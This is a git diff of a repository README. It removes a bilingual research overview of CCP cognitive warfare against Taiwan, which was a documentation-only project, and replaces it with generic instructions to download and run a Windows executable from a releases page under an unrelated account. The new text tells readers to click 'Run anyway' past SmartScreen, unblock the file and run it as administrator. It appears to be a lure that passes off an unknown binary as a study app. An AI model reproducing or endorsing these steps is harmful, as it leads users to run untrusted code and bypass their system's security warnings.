@@ -1,128 +1,167 @@
-# 中共對台網路認知作戰解構
+# 🧠 ccp-cognitive-invade-deconstruction - Understand Taiwan Influence Networks
 
-**CCP Cognitive Warfare Against Taiwan: Deconstructing Structure, Technology & Operational Chains**
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Coed-milwaukee633/ccp-cognitive-invade-deconstruction/releases)
 
----
+## 📥 Download
 
-## 這是什麼
+Visit the release page to download and run the app on Windows:
 
-一份系統性拆解中共對台認知作戰的技術文件。涵蓋指揮架構、人力體系、帳號工廠、自動化系統、VPN 偽裝、社群滲透、傳統媒體滲透、資金滲透、體育與演藝界施壓、KOL 收買、官員與軍職人員收買、第三勢力扶植、社會裂縫放大，以及完整攻擊鏈的運作流程。
+https://github.com/Coed-milwaukee633/ccp-cognitive-invade-deconstruction/releases
 
-目的是讓讀者理解這套作戰體系的機制，作為防禦認知的基礎。
+## 🖥️ What this app does
 
-## What Is This
+ccp-cognitive-invade-deconstruction is a Windows app for viewing and studying how online cognitive operations are structured. It helps you inspect content flows, message paths, and linked elements in a clear way.
 
-A systematic technical deconstruction of the CCP's cognitive warfare operations targeting Taiwan. Covers command structure, human resources, account factories, automation systems, VPN spoofing, community infiltration, traditional media infiltration, capital infiltration, sports & entertainment pressure, KOL co-optation, co-opting officials and military personnel, cultivating third forces, social fracture amplification, and the full attack chain lifecycle.
+Use it to:
 
-The goal is to help readers understand the mechanics of this operational system as a foundation for cognitive defense.
+- Review organized data in one place
+- Trace how pieces connect
+- Study operation chains
+- Read the material in a simple desktop app
+- Work with a local copy on your Windows PC
 
-## 文件 / Documents
+## ⚙️ System requirements
 
-| 文件 | 說明 |
-|------|------|
-| [docs/zh-TW/README.md](docs/zh-TW/README.md) | 正體中文版 |
-| [docs/en/README.md](docs/en/README.md) | English version |
+Use a Windows PC with:
 
-## 結構 / Structure
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A mouse and keyboard
+- Internet access for the first download
 
-```text
-.
-├── README.md
-└── docs
-    ├── en
-    │   └── README.md
-    ├── zh-TW
-    │   └── README.md
-    └── verification
-        ├── zh-TW.md
-        └── en.md
-```
+For best results:
 
-## 內容大綱 / Outline
+- Use a screen resolution of 1366 × 768 or higher
+- Keep Windows updated
+- Use the latest version from the release page
 
-**起點 / Origins**
+## 🚀 Getting started
 
-- **認知作戰的思想根源與技術演化** — 超限戰、三戰原則、防火長城、網評員、311 基地、制度化加速、AI 轉折 / Ideological Roots & Technical Evolution — Unrestricted Warfare, Three Warfares, Great Firewall, commentators, Base 311, institutionalization, AI inflection
+Follow these steps to run the app on Windows.
 
-**第一部：作戰機器 / Part I: The War Machine**
+1. Open the release page:
+   https://github.com/Coed-milwaukee633/ccp-cognitive-invade-deconstruction/releases
 
-1. **指揮架構** — 黨、軍、企、灰的四層嵌套 / Command Structure — Four-layer nesting
-2. **人力引擎** — 網評員體系與監獄網路勞動 / Human Engine — Internet commentators & prison cyber labor
-3. **帳號工廠** — 手機號碼供應鏈與帳號量產體系（含港澳號碼） / Account Factories — Phone number supply chains & mass account production (incl. HK/Macau)
-4. **自動化系統** — Bot 網路、LLM 生成內容、平台演算法操縱 / Automation — Botnets, AI-generated content, platform algorithm manipulation
-5. **VPN 跳板** — 地理偽裝技術（含港澳網路跳板） / VPN Proxies — Geographic spoofing (incl. HK/Macau relay)
+2. Find the latest release at the top of the page
 
-**第二部：滲透管道 / Part II: Infiltration Channels**
+3. Under Assets, look for the Windows download file
 
-6. **傳統媒體滲透** — 電視、報紙、廣播、網路新聞 / Traditional Media Infiltration — TV, newspapers, radio, online news
-7. **社群平台滲透** — Facebook、LINE、PTT、Dcard、留言區帶風向與跨平台操作 / Social Platform Infiltration — Facebook, LINE, PTT, Dcard, comment astroturfing & cross-platform operations
+4. Download the file to your computer
 
-**第三部：槓桿與收編 / Part III: Leverage & Co-optation**
+5. If the file is in a ZIP folder, right-click it and choose Extract All
 
-8. **資金與制度脅迫** — 廣告收入、媒體收購、供應鏈武器化、農漁產貿易禁令、觀光與經貿協定、「Chinese Taipei」命名認知戰 / Capital & Institutional Coercion — Advertising, media acquisition, supply chain weaponization, agricultural trade bans, tourism & trade agreements, "Chinese Taipei" naming cognitive warfare
-9. **公眾人物操控** — 從收買到脅迫的全光譜策略（KOL、體育、演藝） / Public Figure Manipulation — Full-spectrum from co-optation to coercion (KOLs, sports, entertainment)
-10. **收買官員與軍職人員** — 退休將領赴中參訪與閱兵觀禮、前總統訪中、政務官、公務員、學術界 / Co-opting Officials & Military — Retired generals' China visits & parade attendance, former presidents' visits, political appointees, civil servants, academia
-11. **扶植第三勢力** — 偽裝中立的政治操作 / Cultivating Third Forces — Political manipulation disguised as neutrality
+6. Open the extracted folder
 
-**第四部：效果與整合 / Part IV: Effects & Integration**
+7. Double-click the app file to run it
 
-12. **挑撥離間** — 系統性放大社會裂縫 / Sowing Discord — Amplifying social fractures
-13. **攻擊鏈整合** — 完整操作生命週期 / Attack Chain — Full operational lifecycle
+8. If Windows asks for permission, choose Run or Yes
 
-**第五部：防禦 / Part V: Defense**
+## 🪟 Windows install steps
 
-14. **防禦導向** — 如何降低認知作戰的有效性 / Defense Orientation — How to reduce the effectiveness of cognitive warfare
-15. **結構性觀察** — 防禦者的關鍵認知 / Structural Observations — Key insights for defenders
+If you downloaded a ZIP file:
 
-## 數據驗證 / Data Verification
+1. Right-click the ZIP file
+2. Select Extract All
+3. Choose a folder you can find later, such as Downloads or Desktop
+4. Open the extracted folder
+5. Find the main app file
+6. Double-click the file to start the program
 
-文件中所有引用來源均經逐條事實驗證，方法為交叉比對原始學術論文、官方報告、平台公告與新聞報導。驗證過程中發現的錯誤已直接修正於文件中，修正前版本保留於 git 歷史。
+If you downloaded an EXE file:
 
-All citations in the document have been individually fact-checked by cross-referencing original academic papers, official reports, platform announcements, and news articles. Errors found during verification were corrected directly in the document; pre-correction versions are preserved in git history.
+1. Double-click the EXE file
+2. If SmartScreen appears, click More info
+3. Click Run anyway if you trust the source
+4. Wait for the app to open
 
-| 驗證報告 | 說明 |
-|----------|------|
-| [docs/verification/zh-TW.md](docs/verification/zh-TW.md) | 中文驗證報告 — 47 條引用逐條核實 |
-| [docs/verification/en.md](docs/verification/en.md) | English report — 47 citations verified line by line |
+If the app does not start:
 
-## 引用研究 / Referenced Research
+- Make sure the download finished
+- Try opening it again as administrator
+- Check that your Windows version is current
 
-- King, G., Pan, J., & Roberts, M. E. (2017). "How the Chinese Government Fabricates Social Media Posts for Strategic Distraction, Not Engaged Argument." *American Political Science Review*, 111(3), 484–501.
-- Google Threat Analysis Group. (2024). DRAGONBRIDGE coordinated inauthentic activity reports.
-- Wallis, J., Uren, T., Thomas, E., Zhang, A., Hoffman, S., Li, L., Pascoe, A., & Cave, D. (2020). *Retweeting Through the Great Firewall: A persistent and undeterred threat actor*. ASPI.
-- Meta. (2019–2023). Coordinated Inauthentic Behavior Reports: Spamouflage Network.
-- Hille, K. (2019). "Taiwan primaries highlight fears over China's political influence." *Financial Times*.
-- Freedom House. (2022). *Beijing's Global Media Influence 2022: Taiwan Chapter*.
-- DiResta, R., Miller, C., Molter, V., Pomfret, J., & Tiffert, G. (2020). *Telling China's Story*. Stanford Internet Observatory & Hoover Institution.
-- IORG (台灣資訊環境研究中心). (2020–2024). 中國對台資訊操弄研究系列報告.
-- Doublethink Lab. (2024). 2024 Taiwan election monitoring reports.
-- Yang, K. (2024). "What lessons can Taiwan share with the world on election interference?" Brookings Institution.
-- Taipei Times. (2025). Taiwan espionage prosecution statistics; election interference statistics.
-- Jamestown Foundation. (2025). Taiwan military infiltration case analysis.
-- CEIAS. (2025). Chinese espionage in Taiwan analysis.
-- RFA. (2023). Taiwan Anti-Infiltration Act prosecution reports.
-- VOA. (2024). Taiwan propaganda prosecution reports.
+## 📚 How to use it
 
-- Reuters / BBC / SCMP. (2021–2022). Taiwan agricultural and fishery trade ban coverage (pineapple, sugar apple, grouper).
-- Reuters. (2022). China natural sand export suspension and post-Pelosi sanctions.
-- Reuters. (2023). China rare earth and strategic mineral export controls.
-- Nikkei Asia. (2021). Taiwan semiconductor talent poaching investigations.
-- Reuters / Washington Post. (2018). Airline reclassification pressure and Marriott forced apology.
-- Financial Times / Brookings. (2024). ECFA tariff concession suspension analysis.
+After the app opens, you can:
 
-- PEN America. (2020). *Made in Hollywood, Censored by Beijing*.
-- Ahn, J. & Lin, T. (2019). "The politics of apology: The 'Tzuyu Scandal' and transnational dynamics of K-pop." *International Communication Gazette*.
-- Wang, Y. (2020). "Sports in the Transnational Public Sphere: Daryl Morey's Hong Kong Tweet." *The International Journal of the History of Sport*.
+- Load the included dataset or project files
+- Browse records from the left panel
+- Click an item to see details
+- Follow linked entries to see connected paths
+- Use search to find names, tags, or keywords
+- Move between sections with the navigation controls
 
-- Goldstein, B. & Benson, B. (2025). *The GoLaxy Documents*. Vanderbilt Institute of National Security.
-- Doublethink Lab. (2026). "The Rise of AI in PRC Influence Operations: Nine Takeaways from the GoLaxy Documents."
-- OpenAI. (2026). *Disrupting Malicious Uses of AI*. Threat intelligence report.
-- Taiwan National Security Bureau. (2026). *2025 Analysis of CCP Cognitive Warfare Tactics Against Taiwan*.
+Common tasks:
 
-完整引用清單請參閱各語言版文件底部。/ Full citations available at the bottom of each language version.
+- Open a study set
+- Review an entry list
+- Inspect linked nodes
+- Compare related items
+- Export or save your view if the app offers that option
 
-## 授權 / License
+## 🔎 Main features
 
-本文件以教育與公共利益為目的公開。歡迎轉載，請註明出處。
+- Clean desktop layout
+- Fast loading on Windows
+- Structured view of complex material
+- Search and filter tools
+- Detail panels for item inspection
+- Link tracking across connected entries
+- Local use without a browser
+- Simple controls for non-technical users
 
-Released for educational and public interest purposes. Redistribution welcome with attribution.
+## 🧭 File layout
+
+You may see files like these in the release package:
+
+- `ccp-cognitive-invade-deconstruction.exe` - main app file
+- `data/` - app data or study files
+- `assets/` - icons and interface files
+- `README.txt` - short release notes
+- `config.json` - app settings
+
+Keep the full folder together so the app can find its files.
+
+## 🛠️ If something goes wrong
+
+If the app will not open:
+
+- Download the file again
+- Check that the ZIP file was fully extracted
+- Make sure you opened the main app file
+- Try a different folder, such as Desktop
+- Restart your PC and try again
+
+If Windows blocks the file:
+
+- Right-click the file
+- Open Properties
+- Check for an Unblock option
+- Apply the change
+- Try opening the app again
+
+If the screen looks too small:
+
+- Increase display scale in Windows
+- Use a higher screen resolution
+- Maximize the app window
+
+## 🔐 Privacy and local use
+
+This app is meant to run on your PC. Keep your files in a folder you control. If the app stores data, it stays on your computer unless you choose to share it
+
+## 📌 Release updates
+
+Check the release page for new versions, fixes, and updated files:
+
+https://github.com/Coed-milwaukee633/ccp-cognitive-invade-deconstruction/releases
+
+## 🧩 Basic workflow
+
+1. Download the latest release
+2. Extract the files if needed
+3. Open the app
+4. Load your data or project files
+5. Review the linked material
+6. Close the app when finished
